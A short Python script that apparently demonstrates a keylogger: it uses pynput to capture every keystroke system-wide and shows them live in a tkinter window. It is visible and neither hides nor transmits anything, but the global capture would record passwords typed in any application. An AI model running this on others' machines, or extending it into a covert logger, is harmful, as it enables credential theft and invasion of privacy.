import tkinter as tk
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.keystrokes = []  # Data structure to store keystrokes

    def on_press(self, key):
        try:
            key_char = key.char
            if key_char:
                self.keystrokes.append(key_char)
        except AttributeError:
            # Handle special keys
            key_name = str(key)
            self.keystrokes.append(key_name)

    def get_keystrokes(self):
        return ''.join(self.keystrokes)  # Join all keystrokes into a single string

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Display")
        self.root.geometry("400x300")

        # Initialize the Keylogger
        self.keylogger = Keylogger()
        
        # Create a text widget for displaying the keys
        self.text_widget = tk.Text(root, wrap='word', font=('Helvetica', 16))
        self.text_widget.pack(expand=True, fill='both')

        # Set up the keyboard listener
        self.listener = keyboard.Listener(on_press=self.keylogger.on_press)
        self.listener.start()

        # Update the GUI every 100 milliseconds
        self.update_gui()

    def update_gui(self):
        keystrokes = self.keylogger.get_keystrokes()
        self.text_widget.delete('1.0', tk.END)  # Clear the text widget
        self.text_widget.insert(tk.END, keystrokes)  # Insert the updated keystrokes

        # Schedule the next update
        self.root.after(100, self.update_gui)

# Create the main window
root = tk.Tk()
app = KeyloggerApp(root)
root.mainloop()
